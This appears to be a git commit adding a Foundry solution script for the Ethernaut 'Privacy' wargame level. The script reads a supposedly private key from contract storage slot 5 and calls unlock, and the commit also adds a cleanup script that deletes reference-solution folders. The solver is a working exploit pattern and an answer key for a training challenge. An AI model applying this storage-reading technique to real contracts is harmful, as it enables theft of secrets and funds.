c384a8a37f9d94567664cff6eae4c338ade41a3c
Christian Koopmann <christian@MTMAC0057.local>
2022-07-22 13:41:49 +0800

    Solution for 12_Privacy

---
+++ refactor.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+for ProblemName in 00_HelloEthernaut 01_Fallback 02_Fallout 03_CoinFlip 04_Telephone 05_Token 06_Delegate 07_Force 08_Vault 09_King 10_Reentrancy 11_Elevator
+do
+    rm -rf src/${ProblemName}/ReferenceSolution
+done
---
+++ src/12_Privacy/SolutionScript.sol
@@ -0,0 +1,28 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.6.0;
+
+import { Script } from "forge-std/Script.sol";
+import { EthernautScript } from "src/common/EthernautScript.sol";
+import { Privacy } from "./Problem.sol";
+
+contract SolutionScript is EthernautScript {
+    function solve(address payable _instanceAddress) internal override {
+        Privacy privacy = Privacy(_instanceAddress);
+
+        uint256 storageIndex = 5;
+        bytes32 data = vm.load(_instanceAddress, bytes32(storageIndex));
+        bytes16 converted = bytes16(bytes32(data));
+
+        vm.startBroadcast();
+        privacy.unlock(converted);
+        vm.stopBroadcast();
+
+        assert(!privacy.locked());
+
+    }
+
+    function getLevelAddress() internal view override returns (address) {
+        return 0x11343d543778213221516D004ED82C45C3c8788B;
+    }
+
+}
